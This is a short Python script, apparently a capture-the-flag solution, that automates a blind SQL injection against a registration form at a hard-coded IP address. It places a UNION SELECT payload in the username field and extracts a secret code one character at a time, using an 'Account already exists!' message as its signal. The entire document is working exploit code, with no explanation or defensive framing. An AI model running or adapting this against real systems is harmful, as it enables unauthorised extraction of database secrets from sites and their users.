import requests
import string

alphabet = string.ascii_letters + string.digits + "_"

flag = ""
while True:
    for char in alphabet:
        payload = '" UNION SELECT code_string,2,3,4 FROM code WHERE code_string LIKE "' + flag + char + '%" #'
        r = requests.post("http://194.87.248.4:5008/register",
                        data={"username": payload,
                              "password": "password", "code": "code"})
        if r.text.find('<div class="c"><h2>Account already exists!</h2></div>') !=-1:
            flag += char
            print("OK Code=" + flag)
            break

    if char == "_":
        break